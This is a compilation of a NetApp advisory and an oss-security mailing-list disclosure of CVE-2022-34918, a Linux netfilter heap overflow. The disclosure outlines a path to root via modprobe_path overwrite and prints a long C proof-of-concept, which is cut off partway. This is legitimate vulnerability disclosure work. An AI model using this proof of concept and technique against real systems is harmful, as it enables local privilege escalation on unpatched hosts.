=== Content from security.netapp.com_1e650542_20250108_134524.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2022-34918 Linux Kernel Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20220826-0004)

## CVE-2022-34918 Linux Kernel Vulnerability in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20220826-0004 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20220826-0004 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20220826-0004 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20220826-0004 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20220826-0004
**Version:**
1.0

**Last updated:**
08/26/2022

**Status:**
Final.

**CVEs:** CVE-2022-34918

Overview
#### Summary

Multiple NetApp products incorporate Linux Kernel. Linux Kernel versions through 5.18.9 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2022-34918](https://nvd.nist.gov/vuln/detail/CVE-2022-34918) | 7.8 (HIGH) | CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* [https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/T/#u](https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/T/#u)
* <https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6>

Affected Products
#### Affected Products

* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C

#### Products Not Affected

* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7500N
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - Cloud Insights Telegraf Agent
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Acquisition Unit
* Cloud Insights Storage Workload Security Agent
* Cloud Insights Telegraf Agent
* Cloud Volumes ONTAP Mediator
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Service Processor - 8080/8060/8040/8020
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM6 SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster Tiebreaker for clustered Data ONTAP
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9 (formerly Clustered Data ONTAP)
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112
* StorageGRID Baseboard Management Controller (BMC)
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S** | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2876227.html) for more information. |
| **NetApp HCI Baseboard Management Controller (BMC) - H410C** | NetApp HCI Baseboard Management Controller (BMC) - H410C has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2876227.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20220826-0004>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20220826 | Initial Public Release, Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from packetstormsecurity.com_c85f0b9f_20250108_134523.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.openwall.com_748b57a6_20250108_134523.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2022/07/04/8) [[next>]](2) [[<thread-prev]](../../../2022/07/03/6) [[thread-next>]](../../../2022/08/06/5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20220705065628.GA23475@suse.de>
Date: Tue, 5 Jul 2022 08:56:28 +0200
From: Marcus Meissner <meissner@...e.de>
To: oss-security@...ts.openwall.com
Cc: Hugues ANGUELKOV <hanguelkov@...dorisec.fr>
Subject: Re: Linux kernel: Netfilter heap buffer overflow in
 nft_set_elem_init

Hi,

Mitre has assigned CVE-2022-34918 to this issue.

Ciao, Marcus
On Sat, Jul 02, 2022 at 09:37:46PM +0200, Solar Designer wrote:
> Hi,
>
> The message below was meant to start an embargo for the issue, but it
> was CC'ed to netfilter-devel, which is a public mailing list, so it also
> appears here:
>
> [https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452@randorisec.fr/T/#u](https://lore.kernel.org/netfilter-devel/cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/T/#u)
>
> In fact, I am forwarding a copy as downloaded from "lore", but of course
> it looks identical to what reached linux-distros.
>
> Alexander
>
> ----- Forwarded message from Hugues ANGUELKOV <hanguelkov@...dorisec.fr> -----
>
> Date: Fri, 1 Jul 2022 17:43:16 +0200
> To: linux-distros
> Cc: security, pablo, kadlec, fw, netfilter-devel, coreteam, davy, amongodin
> From: Hugues ANGUELKOV <hanguelkov@...dorisec.fr>
> Subject: [vs] Netfilter vulnerability disclosure
>
> Hello everyone,
>
> One of our collaborators at RandoriSec, Arthur Mongodin found a
> vulnerability within the netfilter subsystem during his internship.
> Successful exploitation of this bug leads to a Local Privilege
> Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04
> (Linux 5.15.0-39-generic).
> This vulnerability is a heap buffer overflow due to a weak check and has
> been introduced within the commit
> [fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](<https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81>),
> it affects the Linux kernel since the version 5.8 and is still present today.
>
> The heap buffer overflow happens in the function `nft_set_elem_init`
> (`/net/netfilter/nf_tables_api.c`)
>
> ```c
> void *nft_set_elem_init(const struct nft_set *set,
> ??????????? const struct nft_set_ext_tmpl *tmpl,
> ??????????? const u32 *key, const u32 *key_end,
> ??????????? const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
> {
> ??? struct nft_set_ext *ext;
> ??? void *elem;
>
> ??? elem = kzalloc(set->ops->elemsize + tmpl->len,
> gfp);??????????????????? <===== (0)
> ??? if (elem == NULL)
> ??????? return NULL;
>
> ??? ...
>
> ??? if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
> ??????? memcpy(nft_set_ext_data(ext), data,
> set->dlen);???????????????????? <===== (1)
>
> ??? ...
>
> ??? return elem;
> }
> ```
>
> A buffer is allocated at (0) without taking in consideration the value
> `set->dlen` used at (1) for the copy.
> The computation of the needed space (`tmpl->len`) is realized before the
> call to `nft_set_elem_init`, however,
> ?a weak check on a user input allows a user to provide an element with
> a data length lower than the `set->dlen` for the allocation.
> This check is located within the function `nft_set_elem_parse_data`
> (`/net/netfilter/nf_tables_api.c`).
>
> ```c
> static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
> ????????????????? struct nft_data_desc *desc,
> ????????????????? struct nft_data *data,
> ????????????????? struct nlattr *attr)
> {
>
> ??? ...
>
> ??? if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen)
> {???????? <===== (2)
> ??????? nft_data_release(data, desc->type);
> ??????? return -EINVAL;
> ??? }
>
> ??? return 0;
> }
> ```
>
> As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the
> comparison between `desc->len` and `set->dlen` is not done.
> Finally, `desc->len` it is used to compute `tmpl->len` at (0) and
> `set->dlen` for the copy at (1) and they can be different.
>
> The vulnerable code path can be reached if the kernel is built with the
> configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
> To exploit the vulnerability, an attacker may need to obtain an
> unprivileged user namespace to gain the capability `CAP_NET_ADMIN`
> (`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and
> `kernel.unprivileged_userns_clone = 1`).
>
>
> The exploitation was simplified by the use of an uninitialized variable
> in `nft_add_set_elem`:
>
> ```c
> static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set,
> const struct nlattr *attr, u32 nlmsg_flags)
> {
> ? struct nft_set_elem elem;
> ? ...
> }
> ```
>
> First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data`
> will be filled `set->dlen` bytes, the second iteration will only erase
> the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.
>
> We get an infoleak by overwriting the field `datalen` of
> an`user_key_payload` structure. The write primitive can be obtained with
> an unlinking attack on the `list_head` of the `simple_xattr` structure.
> We targeted the `modprobe_path` to gain root permission by executing a
> shell wrapper.
>
> The following Proof of Concept (PoC) will trigger KASAN on the upstream
> kernel (Linux 5.19.0-rc4)
>
> ```c
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <sched.h>
> #include <stdlib.h>
> #include <stdint.h>
> #include <string.h>
> #include <unistd.h>
> #include <limits.h>
> #include <arpa/inet.h>
> #include <sys/xattr.h>
> #include <sys/socket.h>
> #include <linux/netlink.h>
> #include <linux/netfilter.h>
> #include <linux/netfilter/nfnetlink.h>
> #include <linux/netfilter/nf_tables.h>
>
> #define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); }
> while(0)
>
> #define ID 1337
> #define SET_NAME "name\0\0\0"
> #define LEAK_SET_NAME "leak\0\0\0"
> #define TABLE "table\0\0"
>
> #define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
> #define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
> #define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
> #define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
> #define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)
>
> #define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) +
> sizeof(struct nlattr) + 8)
>
> #define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize -
> sizeof(nft_set_ext)(align) - min datasize
>
> #define BUFFER_SIZE 64
>
> uint8_t buffer[BUFFER_SIZE] = {0};
>
> void new_ns(void) {
>
> ??? if (unshare(CLONE_NEWUSER))
> ??????? do_error_exit("unshare(CLONE_NEWUSER)");
>
> ??? if (unshare(CLONE_NEWNET))
> ??????? do_error_exit("unshare(CLONE_NEWNET)");
> }
>
> struct nlmsghdr *get_batch_begin_nlmsg(void) {
>
> ??? struct nlmsghdr *nlh = (struct nlmsghdr
> *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
> ??? struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);
>
> ??? if (!nlh)
> ??????? do_error_exit("malloc");
>
> ??? memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
> ??? nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
> ??? nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
> ??? nlh->nlmsg_pid = getpid();
> ??? nlh->nlmsg_flags = 0;
> ??? nlh->nlmsg_seq = 0;
>
> ??? /* Used to access to the netfilter tables subsystem */
> ??? nfgm->res_id = NFNL_SUBSYS_NFTABLES;
>
> ??? return nlh;
> }
>
> struct nlmsghdr *get_batch_end_nlmsg(void) {
>
> ??? struct nlmsghdr *nlh = (struct nlmsghdr
> *)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
>
> ??? if (!nlh)
> ??????? do_error_exit("malloc");
>
> ??? memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
> ??? nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
> ??? nlh->nlmsg_type = NFNL_MSG_BATCH_END;
> ??? nlh->nlmsg_pid = getpid();
> ??? nlh->nlmsg_flags = NLM_F_REQUEST;
> ??? nlh->nlmsg_seq = 0;
>
> ??? return nlh;
> }
>
> struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type,
> uint16_t data_len) {
> ??? attr->nla_type = type;
> ??? attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
> ??? return (void *)attr + sizeof(struct nlattr);
> }
>
> struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t
> value) {
> ??? attr->nla_type = type;
> ??? attr->nla_len = U32_NLA_SIZE;
> ??? *(uint32_t *)NLA_ATTR(attr) = htonl(value);
>
> ??? return (void *)attr + U32_NLA_SIZE;
> }
>
> struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const
> char name[8]) {
> ??? attr->nla_type = type;
> ??? attr->nla_len = S8_NLA_SIZE;
> ??? memcpy(NLA_ATTR(attr), name, 8);
>
> ??? return (void *)attr + S8_NLA_SIZE;
> }
>
> struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type,
> uint8_t *buffer, uint64_t buffer_size) {
> ??? attr->nla_type = type;
> ??? attr->nla_len = NLA_BIN_SIZE(buffer_size);
> ??? memcpy(NLA_ATTR(attr), buffer, buffer_size);
>
> ??? return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
> }
> void create_table(int sock, const char *name) {
> ??? struct msghdr msg;
> ??? struct sockaddr_nl dest_snl;
> ??? struct iovec iov[3];
> ??? struct nlmsghdr *nlh_batch_begin;
> ??? struct nlmsghdr *nlh;
> ??? struct nlmsghdr *nlh_batch_end;
> ??? struct nlattr *attr;
> ??? struct nfgenmsg *nfm;
>
> ??? /* Destination preparation */
> ??? memset(&dest_snl, 0, sizeof(dest_snl));
> ??? dest_snl.nl_family = AF_NETLINK;
> ??? memset(&msg, 0, sizeof(msg));
>
> ??? /* Netlink batch_begin message preparation */
> ??? nlh_batch_begin = get_batch_begin_nlmsg();
>
> ??? /* Netlink table message preparation */
> ??? nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
> ??? if (!nlh)
> ??????? do_error_exit("malloc");
>
> ??? memset(nlh, 0, TABLEMSG_SIZE);
> ??? nlh->nlmsg_len = TABLEMSG_SIZE;
> ??? nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
> ??? nlh->nlmsg_pid = getpid();
> ??? nlh->nlmsg_flags = NLM_F_REQUEST;
> ??? nlh->nlmsg_seq = 0;
>
> ??? nfm = NLMSG_DATA(nlh);
> ??? nfm->nfgen_family = NFPROTO_INET;
>
> ??? /** Prepare associated attribute **/
> ??? attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
> ??? set_str8_attr(attr, NFTA_TABLE_NAME, name);
>
> ??? /* Netlink batch_end message preparation */
> ??? nlh_batch_end = get_batch_end_nlmsg();
>
> ??? /* IOV preparation */
> ??? memset(iov, 0, sizeof(struct iovec) * 3);
> ??? iov[0].iov_base = (void *)nlh_batch_begin;
> ??? iov[0].iov_len = nlh_batch_begin->nlmsg_len;
> ??? iov[1].iov_base = (void *)nlh;
> ??? iov[1].iov_len = nlh->nlmsg_len;
> ??? iov[2].iov_base = (void *)nlh_batch_end;
> ??? iov[2].iov_len = nlh_batch_end->nlmsg_len;
>
> ??? /* Message header preparation */
> ??? msg.msg_name = (void *)&dest_snl;
> ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
> ??? msg.msg_iov = iov;
> ??? msg.msg_iovlen = 3;
>
> ??? sendmsg(sock, &msg, 0);
>
> ??? /* Free used structures */
> ??? free(nlh_batch_end);
> ??? free(nlh);
> ??? free(nlh_batch_begin);
> }
>
> void create_set(int sock, const char *set_name, uint32_t set_keylen,
> uint32_t data_len, const char *table_name, uint32_t id) {
> ??? struct msghdr msg;
> ??? struct sockaddr_nl dest_snl;
> ??? struct nlmsghdr *nlh_batch_begin;
> ??? struct nlmsghdr *nlh_payload;
> ??? struct nlmsghdr *nlh_batch_end;
> ??? struct nfgenmsg *nfm;
> ??? struct nlattr *attr;
> ??? uint64_t nlh_payload_size;
> ??? struct iovec iov[3];
>
> ??? /* Prepare the netlink sockaddr for msg */
> ??? memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
> ??? dest_snl.nl_family = AF_NETLINK;
>
> ??? /* First netlink message: batch_begin */
> ??? nlh_batch_begin = get_batch_begin_nlmsg();
>
> ??? /* Second netlink message : Set attributes */
> ??? nlh_payload_size = sizeof(struct
> nfgenmsg);???????????????????????????????????? // Mandatory
> ??? nlh_payload_size +=
> S8_NLA_SIZE;??????????????????????????????????????????????? //
> NFTA_SET_TABLE
> ??? nlh_payload_size +=
> S8_NLA_SIZE;??????????????????????????????????????????????? // NFTA_SET_NAME
> ??? nlh_payload_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? // NFTA_SET_ID
> ??? nlh_payload_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? //
> NFTA_SET_KEY_LEN
> ??? nlh_payload_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? //
> NFTA_SET_FLAGS
> ??? nlh_payload_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? //
> NFTA_SET_DATA_TYPE
> ??? nlh_payload_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? //
> NFTA_SET_DATA_LEN
> ??? nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
>
> ??? /** Allocation **/
> ??? nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
> ??? if (!nlh_payload)
> ??????? do_error_exit("malloc");
>
> ??? memset(nlh_payload, 0, nlh_payload_size);
>
> ??? /** Fill the required fields **/
> ??? nlh_payload->nlmsg_len = nlh_payload_size;
> ??? nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
> ??? nlh_payload->nlmsg_pid = getpid();
> ??? nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
> ??? nlh_payload->nlmsg_seq = 0;
>
>
> ??? /** Setup the nfgenmsg **/
> ??? nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
> ??? nfm->nfgen_family =
> NFPROTO_INET;?????????????????????????????????????????????? // Verify if
> it is compulsory
>
> ??? /** Setup the attributes */
> ??? attr = (struct nlattr *)((void *)nlh_payload +
> NLMSG_SPACE(sizeof(struct nfgenmsg)));
> ??? attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
> ??? attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
> ??? attr = set_u32_attr(attr, NFTA_SET_ID, id);
> ??? attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
> ??? attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
> ??? attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
> ??? set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);
>
> ??? /* Last netlink message: batch_end */
> ??? nlh_batch_end = get_batch_end_nlmsg();
>
> ??? /* Setup the iovec */
> ??? memset(iov, 0, sizeof(struct iovec) * 3);
> ??? iov[0].iov_base = (void *)nlh_batch_begin;
> ??? iov[0].iov_len = nlh_batch_begin->nlmsg_len;
> ??? iov[1].iov_base = (void *)nlh_payload;
> ??? iov[1].iov_len = nlh_payload->nlmsg_len;
> ??? iov[2].iov_base = (void *)nlh_batch_end;
> ??? iov[2].iov_len = nlh_batch_end->nlmsg_len;
>
> ??? /* Prepare the message to send */
> ??? memset(&msg, 0, sizeof(struct msghdr));
> ??? msg.msg_name = (void *)&dest_snl;
> ??? msg.msg_namelen = sizeof(struct sockaddr_nl);
> ??? msg.msg_iov = iov;
> ??? msg.msg_iovlen = 3;
>
> ??? /* Send message */
> ??? sendmsg(sock, &msg, 0);
>
> ??? /* Free allocated memory */
> ??? free(nlh_batch_end);
> ??? free(nlh_payload);
> ??? free(nlh_batch_begin);
> }
>
> void add_elem_to_set(int sock, const char *set_name, uint32_t
> set_keylen, const char *table_name, uint32_t id, uint32_t data_len,
> uint8_t *data) {
> ??? struct msghdr msg;
> ??? struct sockaddr_nl dest_snl;
> ??? struct nlmsghdr *nlh_batch_begin;
> ??? struct nlmsghdr *nlh_payload;
> ??? struct nlmsghdr *nlh_batch_end;
> ??? struct nfgenmsg *nfm;
> ??? struct nlattr *attr;
> ??? uint64_t nlh_payload_size;
> ??? uint64_t nested_attr_size;
> ??? struct iovec iov[3];
>
> ??? /* Prepare the netlink sockaddr for msg */
> ??? memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
> ??? dest_snl.nl_family = AF_NETLINK;
>
> ??? /* First netlink message: batch */
> ??? nlh_batch_begin = get_batch_begin_nlmsg();
>
> ??? /* Second netlink message : Set attributes */
>
> ??? /** Precompute the size of the nested field **/
> ??? nested_attr_size = 0;
>
> ??? nested_attr_size += sizeof(struct
> nlattr);????????????????????????????????????? // Englobing attribute
> ??? nested_attr_size += sizeof(struct
> nlattr);????????????????????????????????????? // NFTA_SET_ELEM_KEY
> ??? nested_attr_size +=
> NLA_BIN_SIZE(set_keylen);????????????????????????????????????? //
> NFTA_DATA_VALUE
> ??? nested_attr_size += sizeof(struct
> nlattr);????????????????????????????????????? // NFTA_SET_ELEM_DATA
> ??? nested_attr_size += sizeof(struct
> nlattr);????????????????????????????????????? // NFTA_DATA_VERDICT
> ??? nested_attr_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? //
> NFTA_VERDICT_CODE
>
> ??? nlh_payload_size = sizeof(struct
> nfgenmsg);???????????????????????????????????? // Mandatory
> ??? nlh_payload_size += sizeof(struct
> nlattr);????????????????????????????????????? // NFTA_SET_ELEM_LIST_ELEMENTS
> ??? nlh_payload_size +=
> nested_attr_size;?????????????????????????????????????????? // All the
> stuff described above
> ??? nlh_payload_size +=
> S8_NLA_SIZE;??????????????????????????????????????????????? //
> NFTA_SET_ELEM_LIST_TABLE
> ??? nlh_payload_size +=
> S8_NLA_SIZE;??????????????????????????????????????????????? //
> NFTA_SET_ELEM_LIST_SET
> ??? nlh_payload_size +=
> U32_NLA_SIZE;?????????????????????????????????????????????? //
> NFTA_SET_ELEM_LIST_SET_ID
> ??? nlh_payload_size = NLMSG_SPACE(nlh_payload_size);
>
> ??? /** Allocation **/
> ??? nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
> ??? if (!nlh_payload) {
> ??????? do_error_exit("malloc");
> ??? }
> ??? memset(nlh_payload, 0, nlh_payload_size);
>
> ??? /** Fill the required fields **/
> ??? nlh_payload->nlmsg_len = nlh_payload_size;
> ??? nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) |
> NFT_MSG_NEWSETELEM;
> ??? nlh_payload->nlmsg_pid = getpid();
> ??? nlh_payload->nlmsg_flags = NLM_F_REQUEST;
> ??? nlh_payload->nlmsg_seq = 0;
>
> ??? /** Setup the nfgenmsg **/
> ??? nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
> ??? nfm->nfgen_family = NFPROTO_INET;
>
> ??? /** Setup the attributes */
> ??? attr = (struct nlattr *)((void *)nlh_payload +
> NLMSG_SPACE(sizeof(struct nfgenmsg)));
> ??? attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
> ??? attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
> ??? attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
